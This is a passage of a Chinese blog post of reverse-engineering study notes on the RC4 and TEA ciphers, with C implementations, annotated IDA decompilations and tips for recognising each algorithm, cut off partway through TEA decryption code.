class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span> </span><span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> key_Len<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//临时向量 k</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>          k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> key_Len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Len = strlen(key)，密钥的长度  </span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//打乱s表  </span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]  </span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> Data_Len<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> Data_Len<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          tmp <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>          s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//交换s[i]和s[j]  </span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>          t <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>          Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^=</span> s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例一</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"password123456789"</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"SecretKey"</span><span class="token punctuation">;</span>   <span class="token comment">// 密钥 key      </span>      <span class="token comment">// 获取密钥长度  </span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> key_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 初始化 RC4 状态向量  </span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> state<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token function">rc4_init</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 加密数据  </span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后: %s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 重新初始化 RC4 状态向量  </span>    <span class="token function">rc4_init</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 解密数据  </span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后: %s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">/* 输出：加密后: d貽4�l普!r樒u箯解密后: password123456789*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>示例二</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x6f</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"SecretKey"</span><span class="token punctuation">;</span>   <span class="token comment">// 密钥 key</span>    <span class="token comment">// 获取数据长度</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> data_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取密钥长度</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> key_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 初始化 RC4 状态向量</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> state<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">rc4_init</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 加密数据</span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> data<span class="token punctuation">,</span> data_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后: %s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 重新初始化 RC4 状态向量</span>    <span class="token function">rc4_init</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 解密数据</span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> data<span class="token punctuation">,</span> data_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后: %s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 输出：加密后: d貽4�l普!r樒u箯D&#123;�解密后: password123456789D&#123;�*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="IDA-示例-1"><a href="#IDA-示例-1" class="headerlink" title="IDA 示例"></a>IDA 示例</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">rc4_init</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>  _DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token comment">//循环给 s 盒赋值</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token comment">//循环根据密钥 key 对 s 盒进行 swap</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">//Ⅰ、Ⅱ、Ⅲ 交换v9[j]和v9[v7]的值</span>    v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅰ</span>    v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">+</span> v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅱ</span>    v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    <span class="token comment">//Ⅲ</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v6 <span class="token operator">>=</span> a3 <span class="token punctuation">)</span>      v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>_DWORD <span class="token operator">*</span>__fastcall <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]</span>  _DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-10h]</span>  v5 <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a3<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">//Ⅰ、Ⅱ、Ⅲ、Ⅳ 交换v9[v5]和v9[v6]的值</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅰ</span>    v7 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//Ⅱ</span>    v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    <span class="token comment">//Ⅲ</span>    v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token comment">//Ⅳ</span>    <span class="token operator">*</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v9<span class="token punctuation">[</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> v5<span class="token punctuation">;</span>  result <span class="token operator">=</span> a1<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h1><blockquote><p>TEA 算法全称微型加密算法，最初是由剑桥计算机实验室的 David Wheeler 和 Roger Needham 在 1994 年设计的。 TEA 算法使用 64 位的明文分组和 128 位的密钥，它使用 Feistel 分组加密框架，需要进行 64 轮迭代，尽管作者认为 32 轮已经足够了，<strong>32 轮迭代加密后得到的密文就是 64 位</strong></p><p>该算法使用了一个神秘常数 <code>δ（Delta）</code> 作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但 <code>δ（Delta）</code> 的精确值似乎并不重要，这里 TEA 把它定义为 <code>δ =「(√5 - 1)231」</code>（也就是程序中的 <code>0x9e3779b9</code>）</p><p><em>相关 Writeup 见 《【GDOUCTF2023】Tea》</em></p></blockquote><h2 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h2><ol><li><p><strong>密钥为 128 位</strong> <em>（一般分为 4 个 32 位子密钥）</em>，<strong>明文为 64 位</strong> <em>（一般分为 2 个 32 位明文）</em>，主要做了 <strong>32 轮变换</strong>，每轮变换中都涉及移位和变换操作</p></li><li><p>TEA 算法中有一个固定的常数 <code>δ（Delta）</code>，通常为 <code>0x9e3779b9</code> 或者 <code>0x61c88647</code>，当然也可能魔改</p></li><li><p>有对常数 <code>δ（Delta）</code> 进行的操作，在 TEA 算法加密过程中，<code>δ = 0x9e3779b9</code> 时代码中会出现累加，<code>δ = 0x61c88647</code> 时代码中会出现累减 <mark>（也就是说，加密过程中：<code>sum -= 0x61c88647</code> 和 <code>sum += 0x9e3779b9</code>，这两个值是等价的）</mark></p></li><li><p>当 <code>δ = 0x9e3779b9</code> 时，解密的初始值 <code>sun = num_rounds * DELTA</code>；当 <code>δ = 0x61c88647</code> 时，解密的初始值 <code>sun = - num_rounds * DELTA</code></p></li><li><p>涉及到的移位操作通常是左移 4 位、右移 5 位</p></li><li><p><mark>在 TEA 算法中取密钥 key 的时候是固定下标取的</mark></p></li></ol><hr><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ol><li>将明文按 64 位（8 字节）分组，每组视为一个 64 位的二进制数，同时将这 64 位的二进制数分成两个相等长度的部分 <code>v0</code> 和 <code>v1</code>（两个 32 位明文数据）</li><li>将 128 位的密钥分成 4 个 32 位的子密钥，分别记为 <code>k0、k1、k2、k3</code>（四个 32 位密钥）</li><li>设定一个 32 位的常数 delta，其值为 <code>0x9E3779B9</code>，（也可以为 <code>0x61c88647</code>）</li><li>定义 32 轮加密迭代，每轮中右半部分会经过一个运算，包括左移、异或、加等操作，并且每轮的密钥是不同的</li><li>最后得到经过加密算法加密的密文 <code>v0&#39;</code> 和 <code>v1&#39;</code></li></ol><p>加密流程如图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%813.png" alt="加密算法的函数特征3.png"></p><hr><h2 id="加解密代码-2"><a href="#加解密代码-2" class="headerlink" title="加解密代码"></a>加解密代码</h2><h3 id="C-版"><a href="#C-版" class="headerlink" title="C++ 版"></a>C++ 版</h3><ul><li><p><strong>特点</strong></p><ol><li>包含具体实现流程</li><li>支持快速修改加密轮数 <code>num_rounds</code> 和 <code>delta</code> 的值</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span>   </span><span class="token comment">// delta值</span></span><span class="token comment">//加密函数  </span><span class="token keyword">void</span> <span class="token function">tea_encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// 初始化参数   </span>    <span class="token keyword">uint32_t</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">// 初始sum为0  </span>    <span class="token keyword">uint32_t</span> k0 <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k1 <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k2 <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k3 <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment">// key值  </span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_rounds<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 一般为32轮加密  </span>        sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>          v0 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k0<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k1<span class="token punctuation">)</span><span class="token punctuation">;</span>          v1 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> k2<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> k3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>   <span class="token comment">// 将结果存回原密钥数组  </span><span class="token punctuation">&#125;</span>  <span class="token comment">//解密函数  </span><span class="token keyword">void</span> <span class="token function">tea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token 